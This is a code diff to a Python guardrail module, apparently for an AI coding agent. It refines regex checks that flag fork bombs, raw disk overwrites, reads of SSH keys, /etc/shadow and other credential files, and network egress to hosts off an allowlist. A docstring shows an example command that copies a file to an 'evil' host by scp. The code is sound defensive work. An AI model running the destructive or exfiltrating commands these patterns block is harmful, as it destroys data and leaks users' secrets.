@@ -41,6 +41,7 @@ import logging
 import os
 import re
 from typing import TYPE_CHECKING
+from urllib.parse import urlparse
 
 if TYPE_CHECKING:
     from pathlib import Path
@@ -51,19 +52,28 @@ from .confirm import ConfirmationResult
 
 logger = logging.getLogger(__name__)
 
+_VALID_MODES = frozenset({"off", "shadow", "enforce"})
+_WRITE_TOOLS = frozenset({"save", "append", "patch", "patch_many", "morph"})
+_SHELL_READ_VERB = re.compile(
+    r"\b(?:cat|less|more|head|tail|bat|type|xxd|hexdump|strings|od|nl|tac)\b"
+)
+
 # ── Shell policy patterns ──────────────────────────────────────────────────────
 # (pattern, short_reason)
 _SHELL_POLICY: list[tuple[re.Pattern[str], str]] = [
     # Fork bombs
     (re.compile(r":\(\)\s*\{.*?:\s*\|"), "fork bomb (: shell function)"),
     (re.compile(r"\bforkbomb\b", re.IGNORECASE), "explicit fork bomb"),
-    # Raw disk writes — dd to block device, redirect to /dev/sd*/nvme*
+    # Raw disk writes — include partition suffixes (sda1, nvme0n1, nvme0n1p2).
+    # A trailing \b after `nvme\d` fails on nvme0n1 because `n` is a word char.
     (
-        re.compile(r"\bdd\b.*\bof=/dev/(?:sd[a-z]|nvme\d|hd[a-z])\b"),
+        re.compile(
+            r"\bdd\b.*\bof=/dev/(?:sd[a-z]\d*|nvme\d+(?:n\d+(?:p\d+)?)?|hd[a-z]\d*)\b"
+        ),
         "raw disk write (dd)",
     ),
     (
-        re.compile(r">\s*/dev/(?:sd[a-z]|nvme\d|hd[a-z])\b"),
+        re.compile(r">\s*/dev/(?:sd[a-z]\d*|nvme\d+(?:n\d+(?:p\d+)?)?|hd[a-z]\d*)\b"),
         "raw disk overwrite",
     ),
     # Destructive SQL — only when piped into a DB client or executed via -e/-c
@@ -85,8 +95,8 @@ _SHELL_POLICY: list[tuple[re.Pattern[str], str]] = [
 ]
 
 # ── Secret-read path patterns ──────────────────────────────────────────────────
-# Applied to tool content (shell commands, read paths, …) for any tool.
-_SECRET_PATH: list[re.Pattern[str]] = [
+# High-confidence identity/credential locations: always flagged on read + shell.
+_SECRET_PATH_STRICT: list[re.Pattern[str]] = [
     # SSH private keys (but not config/known_hosts/authorized_keys)
     re.compile(r"~/\.ssh/(?!(?:config|known_hosts|authorized_keys)(?:\b|$))"),
     re.compile(r"/\.ssh/id_(?:rsa|ed25519|ecdsa|dsa)(?:\b|$)"),
@@ -96,8 +106,6 @@ _SECRET_PATH: list[re.Pattern[str]] = [
     re.compile(r"~/\.gnupg/(?:secring|private-keys)"),
     # Kubernetes secrets
     re.compile(r"~/\.kube/"),
-    # Private key files
-    re.compile(r"\.(?:pem|key|p12|pfx|crt|cert)(?:\b|$)"),
     # Unix shadow / etc passwords
     re.compile(r"/etc/shadow\b"),
     # dotenv files that typically hold secrets
@@ -105,17 +113,41 @@ _SECRET_PATH: list[re.Pattern[str]] = [
     # Generic secret config filenames
     re.compile(r"\b(?:secrets?|credentials?)\.(?:ya?ml|json|toml|ini)\b"),
 ]
+# Suffixes that are secrets when *read* but also legitimate write/keygen targets.
+_SECRET_PATH_GENERIC: list[re.Pattern[str]] = [
+    re.compile(r"\.(?:pem|key|p12|pfx|crt|cert)(?:\b|$)"),
+]
 
 # ── Egress command detection ───────────────────────────────────────────────────
 _EGRESS_CMD = re.compile(
     r"\b(?:curl|wget|nc|netcat|ncat|nmap|ssh|scp|rsync|ftp|sftp|socat)\b"
 )
-_URL_HOST = re.compile(r"https?://([a-zA-Z0-9][a-zA-Z0-9.\-]*[a-zA-Z0-9])")
+_NON_HTTP_EGRESS = re.compile(
+    r"\b(?:nc|netcat|ncat|nmap|ssh|scp|rsync|ftp|sftp|socat)\b"
+)
+_HTTP_URL = re.compile(r"https?://[^\s'\"\\]+")
+_SCP_HOST = re.compile(
+    r"(?:^|[\s])(?:[\w.-]+@)?([a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9])(?::[^\s:]*)"
+)
+_SSH_HOST = re.compile(
+    r"\bssh\b(?:\s+-[^\s]+)*\s+(?:[\w.-]+@)?([a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9])"
+)
+_NC_HOST = re.compile(
+    r"\b(?:nc|netcat|ncat)\b(?:\s+-[^\s]+)*\s+([a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9])"
+)
+_URL_SCHEMES = frozenset({"http", "https", "ftp", "sftp", "ssh", "file", "git"})
 
 
 def _mode() -> str:
-    """Return the active guardrails mode: ``off`` | ``shadow`` | ``enforce``."""
-    return os.environ.get("GPTME_GUARDRAILS", "shadow").strip().lower()
+    """Return the active guardrails mode: ``off`` | ``shadow`` | ``enforce``.
+
+    Unrecognized values (typos such as ``shdow``) fall back to ``shadow`` so a
+    misconfigured env var never silently enables enforcement.
+    """
+    raw = os.environ.get("GPTME_GUARDRAILS", "shadow").strip().lower()
+    if raw in _VALID_MODES:
+        return raw
+    return "shadow"
 
 
 def _egress_allowlist() -> list[str]:
@@ -132,12 +164,45 @@ def _check_shell_policy(cmd: str) -> str | None:
     return None
 
 
-def _check_secret_read(content: str) -> str | None:
+def _check_secret_read(content: str, *, include_generic: bool = True) -> str | None:
     """Return a reason string if *content* references a secret path, else ``None``."""
-    for pattern in _SECRET_PATH:
+    patterns = list(_SECRET_PATH_STRICT)
+    if include_generic:
+        patterns.extend(_SECRET_PATH_GENERIC)
+    for pattern in patterns:
         if pattern.search(content):
             return f"sensitive path reference ({pattern.pattern!r})"
     return None
+
+
+def _http_hosts(cmd: str) -> list[str]:
+    """Extract hostnames from HTTP(S) URLs, stripping userinfo via urlparse."""
+    hosts: list[str] = []
+    for match in _HTTP_URL.finditer(cmd):
+        hostname = urlparse(match.group(0)).hostname
+        if hostname:
+            hosts.append(hostname)
+    return hosts
+
+
+def _non_http_hosts(cmd: str) -> list[str]:
+    """Extract scp/rsync/ssh/nc destinations that are not HTTP(S) URLs."""
+    hosts: list[str] = []
+    for match in _SCP_HOST.finditer(cmd):
+        host = match.group(1)
+        if host.lower() not in _URL_SCHEMES:
+            hosts.append(host)
+    hosts.extend(match.group(1) for match in _SSH_HOST.finditer(cmd))
+    hosts.extend(match.group(1) for match in _NC_HOST.finditer(cmd))
+    return hosts
+
+
+def _host_allowlisted(host: str, allowlist: list[str]) -> bool:
+    host_l = host.lower()
+    return any(
+        host_l == allowed.lower() or host_l.endswith("." + allowed.lower())
+        for allowed in allowlist
+    )
 
 
 def _check_egress(cmd: str, allowlist: list[str]) -> str | None:
@@ -146,26 +211,44 @@ def _check_egress(cmd: str, allowlist: list[str]) -> str | None:
     Always returns ``None`` when the allowlist is empty (no allowlist configured
     means the egress check is inactive — users must opt in by setting
     ``GPTME_EGRESS_ALLOWLIST``).
+
+    Mixed commands such as ``curl https://allowlisted.example && scp file evil:``
+    must not be approved just because the HTTP host is allowlisted.
     """
     if not allowlist:
         return None  # egress check inactive — no allowlist configured
     if not _EGRESS_CMD.search(cmd):
         return None
-    hosts = _URL_HOST.findall(cmd)
+    http_hosts = _http_hosts(cmd)
+    other_hosts = _non_http_hosts(cmd)
+    hosts = http_hosts + other_hosts
+    if _NON_HTTP_EGRESS.search(cmd) and not other_hosts:
+        return "network command with unparsed non-HTTP destination (allowlist active)"
     if not hosts:
-        # Network command without a parseable URL — conservative block
         return "network command with no parseable host (allowlist active)"
     for host in hosts:
-        if not any(
-            host == allowed or host.endswith("." + allowed) for allowed in allowlist
-        ):
+        if not _host_allowlisted(host, allowlist):
             return f"network egress to non-allowlisted host {host!r}"
     return None
 
 
-def _evaluate(tool_use: ToolUse) -> str | None:
+def _tool_corpus(tool_use: ToolUse, preview: str | None = None) -> str:
+    """Collect the text the policy should inspect (preview, content, args, kwargs)."""
+    parts: list[str] = []
+    if preview:
+        parts.append(preview)
+    if tool_use.content:
+        parts.append(tool_use.content)
+    if tool_use.args:
+        parts.append(" ".join(str(a) for a in tool_use.args))
+    if tool_use.kwargs:
+        parts.append(" ".join(str(v) for v in tool_use.kwargs.values()))
+    return "\n".join(parts)
+
+
+def _evaluate(tool_use: ToolUse, preview: str | None = None) -> str | None:
     """Run all three guardrail checks and return the first violation reason, or None."""
-    content = tool_use.content or ""
+    content = _tool_corpus(tool_use, preview)
     tool_name = tool_use.tool
 
     # 1. Shell policy — shell tool only
@@ -174,10 +257,17 @@ def _evaluate(tool_use: ToolUse) -> str | None:
         if reason:
             return f"shell policy: {reason}"
 
-    # 2. Secret-read denial — all tools (catches `read ~/.ssh/id_rsa` etc.)
-    reason = _check_secret_read(content)
-    if reason:
-        return f"secret-read: {reason}"
+    # 2. Secret-read denial — reads of credential paths, not writes/keygen.
+    if tool_name not in _WRITE_TOOLS:
+        if tool_name == "read":
+            include_generic = True
+        elif tool_name == "shell":
+            include_generic = bool(_SHELL_READ_VERB.search(content))
+        else:
+            include_generic = False
+        reason = _check_secret_read(content, include_generic=include_generic)
+        if reason:
+            return f"secret-read: {reason}"
 
     # 3. Egress allowlist — shell tool only (requires GPTME_EGRESS_ALLOWLIST)
     if tool_name == "shell":
@@ -204,18 +294,8 @@ def guardrails_hook(
     if mode == "off":
         return None
 
-    # Prefer the richer preview string (contains surrounding context for bg
-    # sequences) over tool_use.content, mirroring how the test guardrail works.
-    check_content = preview or tool_use.content or ""
-
-    # Build a synthetic ToolUse-like target for evaluation using the preview.
-    # We evaluate against a copy with the preview as its content so pattern
-    # matching sees the full context.
-    class _TU:
-        tool = tool_use.tool
-        content = check_content
-
-    violation = _evaluate(_TU())  # type: ignore[arg-type]
+    # Preview (full bg context) is included alongside content/args/kwargs.
+    violation = _evaluate(tool_use, preview)
 
     if violation is None:
         return None
@@ -247,12 +327,13 @@ def register() -> None:
     """
     from . import HookType, register_hook
 
-    mode = _mode()
-    if mode not in ("shadow", "enforce", "off"):
+    raw = os.environ.get("GPTME_GUARDRAILS", "shadow").strip().lower()
+    mode = raw if raw in _VALID_MODES else "shadow"
+    if raw != mode:
         logger.warning(
             "GPTME_GUARDRAILS=%r is not a valid mode (shadow|enforce|off); "
             "defaulting to shadow",
-            mode,
+            raw,
         )
 
     register_hook(
